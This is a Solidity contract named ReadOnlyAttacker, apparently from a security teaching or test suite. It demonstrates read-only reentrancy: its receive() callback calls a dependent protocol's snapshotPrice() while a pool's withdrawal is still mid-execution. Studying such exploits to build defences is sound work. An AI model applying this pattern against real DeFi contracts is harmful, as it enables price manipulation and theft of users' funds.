// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import { DependentProtocol } from "src/security/reentrancy/read-only/DependentProtocol.sol";

interface IReadOnlyPool {
    function deposit() external payable;
    function withdraw(uint256 shares) external;
}

contract ReadOnlyAttacker {
    IReadOnlyPool public pool;
    DependentProtocol public dependent;

    constructor(address pool_, address dependent_) {
        pool = IReadOnlyPool(pool_);
        dependent = DependentProtocol(dependent_);
    }

    function deposit() external payable {
        pool.deposit{ value: msg.value }();
    }

    function attack(uint256 shareAmount) external {
        pool.withdraw(shareAmount);
    }

    receive() external payable {
        // Pool is currently in an intermediate state.
        dependent.snapshotPrice();
    }

    function updatePool(address pool_) external {
        pool = IReadOnlyPool(pool_);
    }
}
